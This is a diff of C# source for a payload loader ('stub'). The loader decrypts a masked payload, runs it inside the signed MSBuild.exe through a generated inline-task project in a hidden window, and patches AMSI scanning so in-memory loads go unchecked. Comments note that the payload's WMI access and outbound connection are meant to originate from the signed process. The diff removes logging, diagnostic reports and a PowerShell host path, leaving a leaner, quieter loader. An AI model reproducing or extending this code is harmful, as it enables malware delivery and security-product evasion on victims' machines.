-                startInfo.Arguments = EXIT_MONITOR_ARGUMENT + " " + current.Id + " " + diagnosticRunId;
-                startInfo.UseShellExecute = false;
-                startInfo.CreateNoWindow = true;
-                Process monitor = Process.Start(startInfo);
-                if (monitor == null)
-                {
-                    Log("EXIT MONITOR not started: Process.Start returned null");
-                    return;
-                }
-                monitor.Close();
-                current.Close();
-            }
-            catch (Exception ex)
-            {
-                LogException("EXIT MONITOR START FAILED", ex);
-            }
-        }
 
         private static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
         {
@@ -2543,20 +945,8 @@ namespace stub
             byte[] data;
             if (dependencies.TryGetValue(simpleName, out data))
             {
-                Log("assembly resolve hit: " + simpleName + "; bytes=" + data.Length);
-                try
-                {
-                    Assembly loaded = Assembly.Load(data);
-                    Log("dependency loaded: " + loaded.FullName);
-                    return loaded;
-                }
-                catch (Exception ex)
-                {
-                    LogException("DEPENDENCY LOAD FAILED: " + simpleName, ex);
-                    throw;
-                }
+                return Assembly.Load(data);
             }
-            Log("assembly resolve miss: " + args.Name);
             return null;
         }
 
@@ -2566,52 +956,11 @@ namespace stub
         // what reaches the disk through the write path is not an assembly. The runtime is
         // then pointed at that same file, which makes the image the process runs from a
         // file backed one instead of a private copy that only ever existed in memory.
-        private static Assembly LoadMaterializedAssembly(byte[] image)
-        {
-            string path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".dll");
-            byte[] masked = new byte[image.Length];
-            for (int i = 0; i < image.Length; i++)
-            {
-                masked[i] = (byte)(image[i] ^ MaterializeMask(i));
-            }
-
-            File.WriteAllBytes(path, masked);
-            materializedPath = path;
-            Log("materialize: staged " + masked.Length + " masked bytes at " + path);
-
-            using (MemoryMappedFile mapped = MemoryMappedFile.CreateFromFile(path, FileMode.Open, null, masked.Length, MemoryMappedFileAccess.ReadWrite))
-            using (MemoryMappedViewAccessor view = mapped.CreateViewAccessor(0, masked.Length, MemoryMappedFileAccess.ReadWrite))
-            {
-                view.WriteArray(0, image, 0, image.Length);
-                view.Flush();
-            }
-            Log("materialize: image placed through the mapped view");
-
-            Assembly loaded = Assembly.LoadFile(path);
-            Log("materialize: assembly loaded from " + path);
-
-            try
-            {
-                File.Delete(path);
-                Log("materialize: carrier removed");
-            }
-            catch (Exception deleteError)
-            {
-                Log("materialize: carrier left in place: " + deleteError.Message);
-            }
-            return loaded;
-        }
-
-        private static byte MaterializeMask(int offset)
-        {
-            return (byte)(((offset * 167) + 13) & 0xFF);
-        }
 
         // ---- signed host execution -----------------------------------------
-        // The payload normally runs in this process. When a host mode is selected the stub
-        // does not load the payload itself: it stages the image under a one time pad and
-        // hands it to a Microsoft signed process (MSBuild.exe or powershell.exe), which
-        // loads this same assembly and calls HostBootstrap inside its own process. The
+        // With the baked-in MSBuild host enabled, the stub does not load the payload itself:
+        // it stages the image under a one time pad and hands it to MSBuild.exe, which loads
+        // this same assembly and calls HostBootstrap inside its own process. The
         // payload load, the provider entry handling, the WMI access and the outbound
         // connection then all originate in that signed image instead of in this file.
         private static byte[] BuildOneTimePad(int length)
@@ -2641,9 +990,7 @@ namespace stub
             {
                 root = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             }
-            catch
-            {
-            }
+            catch { }
             if (String.IsNullOrEmpty(root))
             {
                 root = Path.GetTempPath();
@@ -2653,8 +1000,8 @@ namespace stub
             return directory;
         }
 
-        // MSBuild.exe, csc.exe and powershell.exe ship next to the framework this stub was
-        // compiled against, so ask the runtime first and fall back to the well known paths.
+        // MSBuild.exe ships next to the framework this stub was compiled against, so ask
+        // the runtime first and fall back to the well known paths.
         private static string FindHostExecutable(string fileName)
         {
             List<string> candidates = new List<string>();
@@ -2662,22 +1009,17 @@ namespace stub
             {
                 candidates.Add(Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), fileName));
             }
-            catch
-            {
-            }
+            catch { }
             string windows = null;
             try
             {
                 windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
             }
-            catch
-            {
-            }
+            catch { }
             if (!String.IsNullOrEmpty(windows))
             {
                 candidates.Add(Path.Combine(windows, @"Microsoft.NET\Framework64\v4.0.30319\" + fileName));
                 candidates.Add(Path.Combine(windows, @"Microsoft.NET\Framework\v4.0.30319\" + fileName));
-                candidates.Add(Path.Combine(windows, @"System32\WindowsPowerShell\v1.0\" + fileName));
             }
             for (int i = 0; i < candidates.Count; i++)
             {
@@ -2688,9 +1030,7 @@ namespace stub
                         return candidates[i];
                     }
                 }
-                catch
-                {
-                }
+                catch { }
             }
             return fileName;
         }
@@ -2703,7 +1043,7 @@ namespace stub
         // A project file whose only target runs one inline task. MSBuild compiles that task
         // in its own process; the task body only loads this assembly and calls into it, so
         // everything the payload does happens inside the signed MSBuild process.
-        private static string BuildMsBuildProject(string stubPath, string payloadPath, string padBase64, int holdMilliseconds, string options)
+        private static string BuildMsBuildProject(string stubPath, string payloadPath, string padBase64)
         {
             StringBuilder project = new StringBuilder();
             project.AppendLine(@"<?xml version=""1.0"" encoding=""utf-8""?>");
@@ -2713,8 +1053,6 @@ namespace stub
             project.AppendLine(@"      <Stub ParameterType=""System.String"" Required=""true"" />");
             project.AppendLine(@"      <Payload ParameterType=""System.String"" Required=""true"" />");
             project.AppendLine(@"      <Pad ParameterType=""System.String"" Required=""true"" />");
-            project.AppendLine(@"      <Hold ParameterType=""System.Int32"" Required=""false"" />");
-            project.AppendLine(@"      <Options ParameterType=""System.String"" Required=""false"" />");
             project.AppendLine(@"    </ParameterGroup>");
             project.AppendLine(@"    <Task>");
             project.AppendLine(@"      <Code Type=""Fragment"" Language=""cs"">" + "<!" + "[CDATA[");
@@ -2723,7 +1061,7 @@ namespace stub
             project.AppendLine(@"System.Reflection.MethodInfo bootstrap = program.GetMethod(""HostBootstrap"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);");
             project.AppendLine(@"try");
             project.AppendLine(@"{");
-            project.AppendLine(@"    bootstrap.Invoke(null, new object[] { Payload, Pad, Hold, Options });");
+            project.AppendLine(@"    bootstrap.Invoke(null, new object[] { Payload, Pad });");
             project.AppendLine(@"}");
             project.AppendLine(@"catch (System.Exception ex)");
             project.AppendLine(@"{");
@@ -2734,29 +1072,13 @@ namespace stub
             project.AppendLine(@"    </Task>");
             project.AppendLine(@"  </UsingTask>");
             project.AppendLine(@"  <Target Name=""Boot"">");
-            project.AppendLine(@"    <NcBoot Stub=""" + XmlEscape(stubPath) + @""" Payload=""" + XmlEscape(payloadPath) + @""" Pad=""" + padBase64 + @""" Hold=""" + holdMilliseconds + @""" Options=""" + XmlEscape(options) + @""" />");
+            project.AppendLine(@"    <NcBoot Stub=""" + XmlEscape(stubPath) + @""" Payload=""" + XmlEscape(payloadPath) + @""" Pad=""" + padBase64 + @""" />");
             project.AppendLine(@"  </Target>");
             project.AppendLine(@"</Project>");
             return project.ToString();
         }
 
-        private static string BuildPowerShellScript(string stubPath, string payloadPath, string padBase64, int holdMilliseconds, string options)
-        {
-            StringBuilder script = new StringBuilder();
-            script.AppendLine("$stubAssembly = [System.Reflection.Assembly]::LoadFrom('" + stubPath + "')");
-            script.AppendLine("$programType = $stubAssembly.GetType('stub.Program', $true)");
-            script.AppendLine("$flags = [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static");
-            script.AppendLine("$bootstrap = $programType.GetMethod('HostBootstrap', $flags)");
-            script.AppendLine("$callArguments = New-Object 'System.Object[]' 4");
-            script.AppendLine("$callArguments[0] = '" + payloadPath + "'");
-            script.AppendLine("$callArguments[1] = '" + padBase64 + "'");
-            script.AppendLine("$callArguments[2] = " + holdMilliseconds);
-            script.AppendLine("$callArguments[3] = '" + options + "'");
-            script.AppendLine("$bootstrap.Invoke($null, $callArguments)");
-            return script.ToString();
-        }
-
-        private static int RunHostProcess(string fileName, string arguments, string workingDirectory, string outputFile)
+        private static void RunHostProcess(string fileName, string arguments, string workingDirectory)
         {
             Process host = new Process();
             host.StartInfo.FileName = fileName;
@@ -2764,169 +1086,26 @@ namespace stub
             host.StartInfo.UseShellExecute = false;
             host.StartInfo.CreateNoWindow = true;
             host.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            host.StartInfo.RedirectStandardOutput = true;
-            host.StartInfo.RedirectStandardError = true;
             host.StartInfo.WorkingDirectory = workingDirectory;
             try
             {
                 host.StartInfo.EnvironmentVariables["MSBUILDDISABLENODEREUSE"] = "1";
             }
-            catch
-            {
-            }
-
-            StringBuilder captured = new StringBuilder();
-            object captureSync = new object();
-            DataReceivedEventHandler sink = delegate(object sender, DataReceivedEventArgs line)
-            {
-                if (line.Data == null)
-                {
-                    return;
-                }
-                lock (captureSync)
-                {
-                    captured.AppendLine(line.Data);
-                }
-            };
-            host.OutputDataReceived += sink;
-            host.ErrorDataReceived += sink;
+            catch { }
 
             host.Start();
-            host.BeginOutputReadLine();
-            host.BeginErrorReadLine();
-            Log("host: pid=" + host.Id + " " + Path.GetFileName(fileName));
+            host.WaitForExit();
 
-            bool finished;
-            if (hostWaitSeconds == 0)
-            {
-                finished = host.WaitForExit(1000);
-            }
-            else if (hostWaitSeconds < 0)
-            {
-                host.WaitForExit();
-                finished = true;
-            }
-            else
-            {
-                finished = host.WaitForExit(hostWaitSeconds * 1000);
-            }
-
-            if (!finished)
-            {
-                Log("host: wait window expired; terminating pid=" + host.Id);
-                try
-                {
-                    host.Kill();
-                }
-                catch (Exception killError)
-                {
-                    Log("host: kill failed: " + killError.Message);
-                }
-                try
-                {
-                    host.WaitForExit(5000);
-                }
-                catch
-                {
-                }
-            }
-
-            int exitCode = -1;
-            try
-            {
-                if (host.HasExited)
-                {
-                    host.WaitForExit();
-                    exitCode = host.ExitCode;
-                }
-            }
-            catch (Exception exitError)
-            {
-                Log("host: reading the exit code failed: " + exitError.Message);
-            }
-
-            try
-            {
-                File.WriteAllText(outputFile, captured.ToString());
-            }
-            catch
-            {
-            }
             try
             {
                 host.Close();
             }
-            catch
-            {
-            }
-            return exitCode;
+            catch { }
         }
 
-        private static void LogHostOutput(string outputFile)
-        {
-            try
-            {
-                if (!File.Exists(outputFile))
-                {
-                    Log("host: no host output captured");
-                    return;
-                }
-                string[] lines = File.ReadAllLines(outputFile);
-                int start = Math.Max(lines.Length - 12, 0);
-                for (int i = start; i < lines.Length; i++)
-                {
-                    if (!String.IsNullOrEmpty(lines[i].Trim()))
-                    {
-                        Log("host| " + lines[i]);
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Log("host: reading the host output failed: " + ex.Message);
-            }
-        }
-
-        // Same choice the in-process path makes, so a host run can be steered with the same
-        // switches the diagnostic runs already use.
         private static void PrepareInspection()
         {
-            if (skipAmsiRequested)
-            {
-                Log("inspection: skipped on request");
-            }
-            else if (lookupBlockRequested)
-            {
-                InstallScanLookupBlock();
-            }
-            else if (!neutralizeInspectionEntry)
-            {
-                Log("inspection: entry left untouched");
-            }
-            else if (renameEntryRequested)
-            {
-                if (patchEntryRequested)
-                {
-                    InstallScanRoutinePatch();
-                }
-                else
-                {
-                    InstallInspection();
-                }
-            }
-            else if (String.Equals(inspectionMode, "rename", StringComparison.OrdinalIgnoreCase))
-            {
-                InstallInspection();
-            }
-            else if (String.Equals(inspectionMode, "off", StringComparison.OrdinalIgnoreCase))
-            {
-                Log("inspection: disabled by build setting");
-            }
-            else
-            {
-                ApplyScanOptOut();
-                InstallScanResultStub();
-            }
+            InstallInspection();
         }
 
         // In the host the runtime has almost always resolved the scan entry before this code
@@ -2936,229 +1115,82 @@ namespace stub
         // an in-memory load go through in a process that is already scanning.
         private static void PrepareHostInspection()
         {
-            Log("host inspection: post-initialisation scan handling");
-            if (skipAmsiRequested)
-            {
-                Log("host inspection: skipped on request");
-                return;
-            }
             int redirected = PatchCachedScanEntry();
             if (redirected == 0)
             {
                 ApplyScanOptOut();
                 InstallScanRoutinePatch();
             }
-            if (lookupBlockRequested)
-            {
-                InstallScanLookupBlock();
-            }
-            else if (resultStubRequested)
-            {
-                InstallScanResultStub();
-            }
-            else if (neutralizeInspectionEntry && !String.Equals(inspectionMode, "off", StringComparison.OrdinalIgnoreCase))
-            {
-                InstallInspection();
-            }
-        }
-
-        private static void ApplyHostOptions(string options)
-        {
-            if (String.IsNullOrEmpty(options))
-            {
-                return;
-            }
-            string[] parts = options.Split(new char[] { ',', ';' }, StringSplitOptions.RemoveEmptyEntries);
-            for (int i = 0; i < parts.Length; i++)
-            {
-                string option = parts[i].Trim().ToLowerInvariant();
-                if (option == "log")
-                {
-                    loggingEnabled = true;
-                }
-                else if (option == "skipamsi")
-                {
-                    skipAmsiRequested = true;
-                }
-                else if (option == "keepamsi")
-                {
-                    keepInspectionDisabled = true;
-                }
-                else if (option == "rpatch")
-                {
-                    renameEntryRequested = true;
-                    patchEntryRequested = true;
-                }
-                else if (option == "rename")
-                {
-                    renameEntryRequested = true;
-                }
-                else if (option == "resultstub")
-                {
-                    resultStubRequested = true;
-                }
-                else if (option == "lookup")
-                {
-                    lookupBlockRequested = true;
-                }
-                else if (option == "watch")
-                {
-                    watchRequested = true;
-                }
-            }
-        }
-
-        private static string HostOptionsForChild()
-        {
-            List<string> options = new List<string>();
-            if (loggingEnabled)
-            {
-                options.Add("log");
-            }
-            if (skipAmsiRequested)
-            {
-                options.Add("skipamsi");
-            }
-            if (keepInspectionDisabled)
-            {
-                options.Add("keepamsi");
-            }
-            if (renameEntryRequested)
-            {
-                options.Add("rename");
-            }
-            if (patchEntryRequested)
-            {
-                options.Add("rpatch");
-            }
-            if (resultStubRequested)
-            {
-                options.Add("resultstub");
-            }
-            if (lookupBlockRequested)
-            {
-                options.Add("lookup");
-            }
-            if (watchRequested)
-            {
-                options.Add("watch");
-            }
-            return String.Join(",", options.ToArray());
+            InstallInspection();
         }
 
         private static void RunPayloadInHost(byte[] image)
         {
-            string mode = hostMode.Trim().ToLowerInvariant();
             string stubPath = null;
             try
             {
                 stubPath = Assembly.GetExecutingAssembly().Location;
             }
-            catch
-            {
-            }
+            catch { }
             if (String.IsNullOrEmpty(stubPath) || !File.Exists(stubPath))
             {
                 try
                 {
                     stubPath = Process.GetCurrentProcess().MainModule.FileName;
                 }
-                catch
-                {
-                }
+                catch { }
             }
             if (String.IsNullOrEmpty(stubPath))
             {
                 throw new Exception("The path of this file could not be resolved, so no host can start.");
             }
 
-            string options = HostOptionsForChild();
             string directory = CreateStagingDirectory();
             byte[] pad = BuildOneTimePad(32);
             string padBase64 = Convert.ToBase64String(pad);
             string payloadPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".bin");
             File.WriteAllBytes(payloadPath, ApplyOneTimePad(image, pad));
-            Log("host: mode=" + mode + ", stub=" + stubPath);
-            Log("host: staged " + image.Length + " masked bytes, options=" + (options.Length == 0 ? "(none)" : options));
 
-            string hostFile;
-            string hostArguments;
-            if (mode == "msbuild")
-            {
-                string projectPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".proj");
-                File.WriteAllText(projectPath, BuildMsBuildProject(stubPath, payloadPath, padBase64, hostHoldSeconds * 1000, options), new UTF8Encoding(false));
-                hostFile = FindHostExecutable("MSBuild.exe");
-                hostArguments = "\"" + projectPath + "\" /nologo /verbosity:quiet /nodeReuse:false";
-            }
-            else if (mode == "ps" || mode == "powershell")
-            {
-                string scriptPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".ps1");
-                File.WriteAllText(scriptPath, BuildPowerShellScript(stubPath, payloadPath, padBase64, hostHoldSeconds * 1000, options), new UTF8Encoding(false));
-                hostFile = FindHostExecutable("powershell.exe");
-                hostArguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + scriptPath + "\"";
-            }
-            else
-            {
-                throw new Exception("Unsupported host mode '" + hostMode + "' (expected msbuild or ps).");
-            }
-
-            string outputFile = Path.Combine(directory, "host.out");
-            Log("host: launching " + hostFile);
-            int exitCode = RunHostProcess(hostFile, hostArguments, directory, outputFile);
-            Log("host: exit code=" + exitCode);
-            LogHostOutput(outputFile);
+            string projectPath = Path.Combine(directory, Guid.NewGuid().ToString("N") + ".proj");
+            File.WriteAllText(projectPath, BuildMsBuildProject(stubPath, payloadPath, padBase64), new UTF8Encoding(false));
+            string hostFile = FindHostExecutable("MSBuild.exe");
+            string hostArguments = "\"" + projectPath + "\" /nologo /verbosity:quiet /nodeReuse:false";
+            RunHostProcess(hostFile, hostArguments, directory);
 
             try
             {
                 Directory.Delete(directory, true);
-                Log("host: staging directory removed");
             }
-            catch (Exception deleteError)
-            {
-                Log("host: staging directory left in place: " + deleteError.Message);
-            }
+            catch { }
         }
 
         // Runs inside the signed host. Everything below this line, including the provider
         // entry handling and the payload load, happens in that process.
-        private static void RunPayloadImage(byte[] image, int holdMilliseconds)
+        private static void RunPayloadImage(byte[] image)
         {
-            currentStage = "adjusting inspection entry";
-            LogInspectionStage("AMSI", "PREPARE_BEGIN", "host-side inspection setup reached; external scan execution is not directly observable");
             PrepareHostInspection();
-            LogInspectionStage("AMSI", "PREPARE_COMPLETE", "host-side inspection setup returned");
 
-            currentStage = "loading main assembly";
             Assembly assembly;
-            LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_BEGIN", "managed payload image is about to be loaded from memory in the host");
-            LogInspectionStage("AMSI", "LOAD_OPPORTUNITY", "Assembly.Load reached; this is an AMSI observation point, not proof of a scan");
             try
             {
                 assembly = Assembly.Load(image);
             }
-            catch (Exception loadError)
+            catch
             {
-                if (amsiFallbackUsed || skipAmsiRequested || lookupBlockRequested || resultStubRequested || renameEntryRequested)
+                if (amsiFallbackUsed)
                 {
                     throw;
                 }
                 amsiFallbackUsed = true;
-                Log("host: load blocked: " + InnerMessage(loadError));
-                Log("host: retrying with the clean-result stub");
                 PatchCachedScanEntry();
                 InstallScanResultStub();
                 assembly = Assembly.Load(image);
             }
-            LogInspectionStage("MEMORY", "ASSEMBLY_LOAD_COMPLETE", "managed payload assembly load returned in the host");
-            LogInspectionStage("AMSI", "LOAD_RETURNED", "Assembly.Load returned; no scanner verdict is available to this process");
-            Log("host: assembly loaded: " + assembly.FullName);
 
             // Unlike the in-process path the patches stay in place for the rest of the host:
             // the payload makes its own in-memory loads later and those have to stay out of
             // the scan as well.
-            Log("host: scan handling left in place for the rest of the host run");
 
-            currentStage = "resolving payload entry point";
             MethodInfo entryPoint = assembly.EntryPoint;
             if (entryPoint == null)
             {
@@ -3166,22 +1198,14 @@ namespace stub
             }
             ParameterInfo[] parameters = entryPoint.GetParameters();
             object[] entryArguments = (parameters.Length == 0) ? null : new object[] { new string[0] };
-            Log("host: entry " + entryPoint.Name);
 
-            currentStage = "running payload entry point";
             ThreadStart body = delegate()
             {
-                LogInspectionStage("BEHAVIOR", "ENTRYPOINT_BEGIN", "payload entry point invocation started in the host");
                 try
                 {
                     entryPoint.Invoke(null, entryArguments);
-                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_RETURNED", "payload entry point returned in the host");
                 }
-                catch (Exception entryError)
-                {
-                    LogInspectionStage("BEHAVIOR", "ENTRYPOINT_THREW", entryError.GetType().FullName);
-                    LogException("HOST PAYLOAD ENTRY POINT THREW", entryError);
-                }
+                catch { }
             };
             Thread runner = new Thread(body);
             runner.IsBackground = true;
@@ -3189,870 +1213,34 @@ namespace stub
             {
                 runner.SetApartmentState(ApartmentState.STA);
             }
-            catch
-            {
-            }
+            catch { }
             runner.Start();
-            Log("host: payload entry point started");
             runner.Join();
-            Log("host: payload entry point returned");
 
-            if (holdMilliseconds > 0)
-            {
-                Log("host: holding for " + holdMilliseconds + "ms before the host returns");
-                Thread.Sleep(holdMilliseconds);
-            }
         }
 
         // Called by the signed host through reflection: it loads this assembly, looks up
         // stub.Program and invokes this method there, so the payload image is put back
         // together and run inside that process instead of inside the unsigned stub.
-        internal static void HostBootstrap(string payloadPath, string padBase64, int holdMilliseconds, string options)
+        internal static void HostBootstrap(string payloadPath, string padBase64)
         {
-            try
-            {
-                ApplyHostOptions(options);
-                LogInspectionStage("STATIC", "RUNTIME_REACHED", "host process started; any pre-execution static inspection is external and cannot be confirmed here");
-                Log("host: bootstrap in " + Process.GetCurrentProcess().ProcessName + " (pid=" + Process.GetCurrentProcess().Id + ")");
-                Log("host: options=" + (String.IsNullOrEmpty(options) ? "(none)" : options));
+            byte[] pad = Convert.FromBase64String(padBase64);
+            byte[] image = ApplyOneTimePad(File.ReadAllBytes(payloadPath), pad);
 
-                byte[] pad = Convert.FromBase64String(padBase64);
-                byte[] image = ApplyOneTimePad(File.ReadAllBytes(payloadPath), pad);
-                Log("host: image reconstructed, len=" + image.Length + ", md5=" + HashHex(image));
-
-                InstallDiagnostics();
-                if (watchRequested)
-                {
-                    StartWatch();
-                }
-                AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
-                RunPayloadImage(image, holdMilliseconds);
-            }
-            catch (Exception ex)
-            {
-                LogException("HOST BOOTSTRAP FAILED", ex);
-                throw;
-            }
-            Log("host: bootstrap finished");
-        }
-
-        // Diagnostic: writes a detailed report about the loaded payload to %TEMP%\ncinspect.log.
-        // Used together with --nc-inspect; the payload entry point is not executed here.
-        // --nc-jit (diagnostic only): force every payload method to be compiled to native
-        // code without executing any of it. If the product trips on this run, the verdict is
-        // driven by the payload image/code that now exists in memory. If it does not, the
-        // verdict needs the payload to actually behave, and rewriting the image cannot help.
-        private static void JitPayloadMethods(Assembly assembly)
-        {
-            int prepared = 0;
-            int skipped = 0;
-            try
-            {
-                Type[] types = assembly.GetTypes();
-                for (int t = 0; t < types.Length; t++)
-                {
-                    MethodInfo[] methods;
-                    try
-                    {
-                        methods = types[t].GetMethods(BindingFlags.Public | BindingFlags.NonPublic
-                            | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly);
-                    }
-                    catch (Exception)
-                    {
-                        continue;
-                    }
-                    for (int m = 0; m < methods.Length; m++)
-                    {
-                        try
-                        {
-                            System.Runtime.CompilerServices.RuntimeHelpers.PrepareMethod(methods[m].MethodHandle);
-                            prepared++;
-                        }
-                        catch (Exception)
-                        {
-                            skipped++;
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Log("jit: " + ex.GetType().Name + ": " + ex.Message);
-            }
-            Log("jit: prepared=" + prepared + " skipped=" + skipped);
-        }
-
-        // Printable ascii runs from the decrypted payload image, so the tokens a content
-        // heuristic can key on are visible without a disassembler.
-        private static void DumpImageStrings(byte[] image, StringBuilder report)
-        {
-            report.AppendLine("--- image strings (ascii, 6+) ---");
-            if (image == null)
-            {
-                report.AppendLine("string count=0");
-                return;
-            }
-            int found = 0;
-            int limit = 600;
-            StringBuilder current = new StringBuilder();
-            for (int i = 0; i < image.Length; i++)
-            {
-                byte value = image[i];
-                if (value >= 0x20 && value < 0x7F)
-                {
-                    current.Append((char)value);
-                }
-                else
-                {
-                    if (current.Length >= 6)
-                    {
-                        report.AppendLine("  " + Escape(current.ToString()));
-                        found++;
-                    }
-                    current.Length = 0;
-                }
-                if (current.Length >= 120)
-                {
-                    report.AppendLine("  " + Escape(current.ToString()));
-                    found++;
-                    current.Length = 0;
-                }
-                if (found >= limit)
-                {
-                    report.AppendLine("  (truncated at " + limit + ")");
-                    break;
-                }
-            }
-            if (found < limit && current.Length >= 6)
-            {
-                report.AppendLine("  " + Escape(current.ToString()));
-                found++;
-            }
-            report.AppendLine("string count=" + found);
-        }
-
-        private static void InspectAssembly(Assembly assembly, byte[] image)
-        {
-            StringBuilder report = new StringBuilder();
-            try
-            {
-                report.AppendLine("=== payload inspect " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " ===");
-                report.AppendLine("name=" + Escape(assembly.FullName));
-                report.AppendLine("location=" + Escape(assembly.Location));
-                report.AppendLine("entry=" + Escape(DescribeMethod(assembly.EntryPoint)));
-
-                string[] resources = assembly.GetManifestResourceNames();
-                report.AppendLine("resources=" + resources.Length);
-                for (int i = 0; i < resources.Length; i++)
-                {
-                    string resourceName = resources[i];
-                    long resourceLength = -1;
-                    try
-                    {
-                        using (Stream resourceStream = assembly.GetManifestResourceStream(resourceName))
-                        {
-                            resourceLength = resourceStream == null ? -1 : resourceStream.Length;
-                        }
-                    }
-                    catch
-                    {
-                    }
-                    report.AppendLine("  resource " + Escape(resourceName) + " (" + resourceLength + " bytes)");
-                    if (resourceLength > 0 && resourceLength <= 65536)
-                    {
-                        DumpResourceEntries(assembly, resourceName, report);
-                    }
-                }
-
-                Type[] types;
-                try
-                {
-                    types = assembly.GetTypes();
-                }
-                catch (ReflectionTypeLoadException loadError)
-                {
-                    types = loadError.Types;
-                }
-
-                int typeCount = 0;
-                for (int i = 0; i < types.Length; i++)
-                {
-                    if (types[i] != null)
-                    {
-                        typeCount++;
-                    }
-                }
-                report.AppendLine("types=" + typeCount);
-
-                report.AppendLine("--- namespaces ---");
-                List<string> namespaces = new List<string>();
-                for (int i = 0; i < types.Length; i++)
-                {
-                    if (types[i] == null || types[i].Namespace == null)
-                    {
-                        continue;
-                    }
-                    if (!namespaces.Contains(types[i].Namespace))
-                    {
-                        namespaces.Add(types[i].Namespace);
-                    }
-                }
-                namespaces.Sort(StringComparer.Ordinal);
-                for (int i = 0; i < namespaces.Count && i < 400; i++)
-                {
-                    report.AppendLine("  " + Escape(namespaces[i]));
-                }
-                report.AppendLine("namespace count=" + namespaces.Count);
-
-                report.AppendLine("--- entry type ---");
-                if (assembly.EntryPoint != null && assembly.EntryPoint.DeclaringType != null)
-                {
-                    Type entryType = assembly.EntryPoint.DeclaringType;
-                    report.AppendLine("  " + Escape(entryType.FullName));
-                    FieldInfo[] staticFields = entryType.GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static);
-                    for (int i = 0; i < staticFields.Length && i < 40; i++)
-                    {
-                        report.AppendLine("  static field " + Escape(staticFields[i].Name) + " (" + Escape(staticFields[i].FieldType.Name) + ") = " + Escape(SafeFieldValue(staticFields[i])));
-                    }
-                    MethodInfo[] entryMethods;
-                    try
-                    {
-                        entryMethods = entryType.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly);
-                    }
-                    catch
-                    {
-                        entryMethods = new MethodInfo[0];
-                    }
-                    for (int i = 0; i < entryMethods.Length && i < 400; i++)
-                    {
-                        report.AppendLine("  method " + Escape(DescribeMethod(entryMethods[i])));
-                    }
-                }
-
-                report.AppendLine("--- config-like members ---");
-                int configLines = 0;
-                for (int t = 0; t < types.Length && configLines < 300; t++)
-                {
-                    Type type = types[t];
-                    if (type == null || type.FullName == null)
-                    {
-                        continue;
-                    }
-                    FieldInfo[] fields;
-                    PropertyInfo[] properties;
-                    try
-                    {
-                        fields = type.GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static);
-                        properties = type.GetProperties(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static);
-                    }
-                    catch
-                    {
-                        continue;
-                    }
-                    for (int i = 0; i < fields.Length && configLines < 300; i++)
-                    {
-                        if (!LooksLikeConfigName(fields[i].Name))
-                        {
-                            continue;
-                        }
-                        report.AppendLine("  F " + Escape(type.FullName) + "." + Escape(fields[i].Name) + " = " + Escape(SafeFieldValue(fields[i])));
-                        configLines++;
-                    }
-                    for (int i = 0; i < properties.Length && configLines < 300; i++)
-                    {
-                        if (!LooksLikeConfigName(properties[i].Name))
-                        {
-                            continue;
-                        }
-                        report.AppendLine("  P " + Escape(type.FullName) + "." + Escape(properties[i].Name) + " = " + Escape(SafePropertyValue(properties[i], null)));
-                        configLines++;
-                    }
-                }
-
-                DumpImageStrings(image, report);
-
-                report.AppendLine("--- names of interest ---");
-                int nameLines = 0;
-                string[] nameKeywords = new string[] { "Setting", "Install", "Persist", "Startup", "Mutex", "Program", "Connection", "Credential", "Bypass" };
-                for (int t = 0; t < types.Length && nameLines < 400; t++)
-                {
-                    Type type = types[t];
-                    if (type == null || type.FullName == null)
-                    {
-                        continue;
-                    }
-                    bool interesting = false;
-                    for (int k = 0; k < nameKeywords.Length && !interesting; k++)
-                    {
-                        interesting = type.FullName.IndexOf(nameKeywords[k], StringComparison.OrdinalIgnoreCase) >= 0;
-                    }
-                    if (!interesting)
-                    {
-                        continue;
-                    }
-                    report.AppendLine("  " + Escape(type.FullName) + " (fields=" + type.GetFields(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance).Length + ", methods=" + type.GetMethods(BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static | BindingFlags.Instance | BindingFlags.DeclaredOnly).Length + ")");
-                    nameLines++;
-                }
-            }
-            catch (Exception ex)
-            {
-                report.AppendLine("inspect failed: " + Escape(ex.ToString()));
-            }
-
-            try
-            {
-                File.AppendAllText(Path.Combine(Path.GetTempPath(), "ncinspect.log"), report.ToString());
-                Log("inspect: report appended to ncinspect.log");
-            }
-            catch (Exception writeError)
-            {
-                Log("inspect: report write failed: " + writeError.Message);
-            }
-        }
-
-        private static void DumpResourceEntries(Assembly assembly, string resourceName, StringBuilder report)
-        {
-            try
-            {
-                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
-                {
-                    if (stream == null)
-                    {
-                        return;
-                    }
-                    using (System.Resources.ResourceReader reader = new System.Resources.ResourceReader(stream))
-                    {
-                        System.Collections.IDictionaryEnumerator enumerator = reader.GetEnumerator();
-                        while (enumerator.MoveNext())
-                        {
-                            string key = Escape(Convert.ToString(enumerator.Key));
-                            object value = enumerator.Value;
-                            if (value is string)
-                            {
-                                report.AppendLine("    entry " + key + " = " + Escape((string)value));
-                            }
-                            else if (value is byte[])
-                            {
-                                byte[] bytes = (byte[])value;
